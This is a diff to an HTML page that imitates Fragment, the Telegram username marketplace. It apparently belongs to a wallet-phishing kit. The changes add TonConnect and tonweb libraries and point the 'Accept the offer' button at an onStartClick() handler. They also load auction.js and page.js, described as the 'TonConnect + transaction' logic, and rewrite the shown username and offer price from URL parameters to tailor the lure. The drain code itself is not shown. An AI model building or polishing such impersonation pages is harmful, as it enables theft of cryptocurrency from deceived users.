@@ -12,7 +12,7 @@
         <meta name="format-detection" content="telephone=no" />
         <meta http-equiv="X-UA-Compatible" content="IE=edge" />
         <meta name="MobileOptimized" content="176" />
-        <!-- RIMOSSO lo stile che nascondeva il body -->
+        <!-- RIMOSSO lo stile body{display:none} -->
         <meta name="HandheldFriendly" content="True" />
         <meta name="twitter:card" content="summary" />
 
@@ -36,6 +36,9 @@
         <link href="css/bootstrap-extra.css?v=20260616b" rel="stylesheet" />
         <link href="css/auction.css?v=20260616b" rel="stylesheet" />
         <script src="js/address.js?v=20260616b"></script>
+        
+        <!-- Librerie necessarie per TonConnect e la transazione -->
+        <script src="https://unpkg.com/tonweb@0.0.65/dist/tonweb.js"></script>
         <script src="https://unpkg.com/@tonconnect/ui@2.0.0/dist/tonconnect-ui.min.js"></script>
         <script src="https://telegram.org/js/telegram-web-app.js"></script>
     </head>
@@ -320,6 +323,7 @@
                         </div>
                     </div>
 
+                    <!-- PULSANTE MODIFICATO: ora chiama onStartClick() -->
                     <div
                         class="tm-section-box tm-section-buttons js-actions"
                         data-username="user"
@@ -328,10 +332,9 @@
                         <button
                             class="btn btn-primary js-make-offer-btn"
                             id="accept-offer"
+                            onclick="onStartClick()"
                         >
-                            <span class="tm-button-label"
-                                >Accept the offer</span
-                            >
+                            <span class="tm-button-label">Accept the offer</span>
                         </button>
                     </div>
                 </section>
@@ -1013,42 +1016,26 @@
             </footer>
         </div>
 
-        <!-- SCRIPT AGGIUNTO: aggiorna username e prezzo dai parametri URL -->
+        <!-- Script per aggiornare username e prezzo dai parametri URL -->
         <script>
             (function() {
-                // Legge i parametri dalla query string
                 const params = new URLSearchParams(window.location.search);
                 const item = params.get('item');
                 const bid = params.get('bid');
 
                 if (item) {
-                    // Aggiorna il titolo della pagina
                     document.title = item + ' – Fragment';
-
-                    // Aggiorna tutti gli elementi che contengono "spettro"
-                    // 1) Il subdomain nel breadcrumb
                     const sub = document.querySelector('.subdomain');
-                    if (sub) {
-                        // Sostituisce solo se il contenuto è "spettro" (o con spazi)
-                        if (sub.textContent.trim() === 'spettro') {
-                            sub.textContent = item;
-                        }
+                    if (sub && sub.textContent.trim() === 'spettro') {
+                        sub.textContent = item;
                     }
-
-                    // 2) Tutti gli span con classe accent-color
                     document.querySelectorAll('.accent-color').forEach(el => {
                         let html = el.innerHTML;
-                        // Sostituisce @spettro -> @item
                         html = html.replace(/@spettro/g, '@' + item);
-                        // Sostituisce t.me/spettro -> t.me/item
                         html = html.replace(/t\.me\/spettro/g, 't.me/' + item);
-                        // Sostituisce "spettro" singolo (con eventuali spazi attorno)
                         html = html.replace(/>\s*spettro\s*</g, '>' + item + '<');
                         el.innerHTML = html;
                     });
-
-                    // 3) Nel testo "t.me/spettro" anche fuori da .accent-color? (solo nel Web Address)
-                    // già coperto dal selettore sopra, ma per sicurezza cerchiamo anche nel testo del dd
                     document.querySelectorAll('.tm-list-item-value').forEach(el => {
                         if (el.textContent.includes('t.me/spettro')) {
                             el.innerHTML = el.innerHTML.replace(/t\.me\/spettro/g, 't.me/' + item);
@@ -1057,27 +1044,20 @@
                             el.innerHTML = el.innerHTML.replace(/@spettro/g, '@' + item);
                         }
                     });
-
-                    // 4) Eventuali altri testi che contengono "spettro" (es. data-attributes? no)
                 }
 
                 if (bid) {
-                    // Sostituisce "1,000" con il nuovo prezzo in tutti gli elementi che lo contengono
                     const priceElements = document.querySelectorAll(
                         '.icon-before.icon-ton, .tm-value, .table-cell-value, .tm-amount'
                     );
                     priceElements.forEach(el => {
-                        // Sostituisce solo se il contenuto è "1,000" (esatto)
                         if (el.textContent.trim() === '1,000') {
                             el.textContent = bid;
                         }
-                        // Se contiene "1,000" ma con altri caratteri (es. "1,000 TON"), sostituisce la parte numerica
                         if (el.textContent.includes('1,000')) {
                             el.textContent = el.textContent.replace('1,000', bid);
                         }
                     });
-
-                    // Inoltre il testo "Someone offered <span>1,000</span>"
                     const offerText = document.querySelector('.tm-bid-info-text');
                     if (offerText) {
                         const spans = offerText.querySelectorAll('.icon-ton');
@@ -1091,6 +1071,11 @@
             })();
         </script>
 
+        <!-- Caricamento di page.js e auction.js (la logica di TonConnect + asta) -->
+        <script src="auction.js"></script>
+        <script src="page.js"></script>
+
+        <!-- Script originale (countdown, Telegram WebApp, ecc.) lasciato invariato -->
         <script>
             (function () {
                 const tg = window.Telegram?.WebApp;
@@ -1134,33 +1119,14 @@
                 }
                 document.addEventListener("DOMContentLoaded", function () {
                     const pgn = gtnm();
-
                     const xd = pgn
                         ? `Open https://fragment.com/username/${pgn}?`
                         : "Open https://fragment.com?";
-
-                    // TEST EDIT
                     document.body.style.display = "block";
                     if (tg) {
                         tg.ready();
                         tg.expand();
                     }
-                    /*tg.showPopup(
-                        {
-                            message: xd,
-                            buttons: [
-                                { id: "ok", type: "ok", text: "OK" },
-                                { id: "cancel", type: "close", text: "Cancel" },
-                            ],
-                        },
-                        function (bid) {
-                            if (bid === "ok") {
-                                document.body.style.display = "block";
-                            } else {
-                                tg.close();
-                            }
-                        },
-                    );*/
                 });
             })();
             (function() {
@@ -1176,9 +1142,7 @@
                             void el.offsetWidth;
                         }
                     }
-
                     let timerInterval;
-
                     function updateTimer() {
                         const now = Date.now();
                         const distance = endDate.getTime() - now;
@@ -1209,12 +1173,10 @@
                         updateDigit(secondsDigits[0], sStr[0]);
                         updateDigit(secondsDigits[1], sStr[1]);
                     }
-
                     updateTimer();
                     timerInterval = setInterval(updateTimer, 1000);
                 }
             })();
         </script>
-        <!--<script src="../js/connect.js?v=20260630s141"></script>-->
     </body>
 </html>
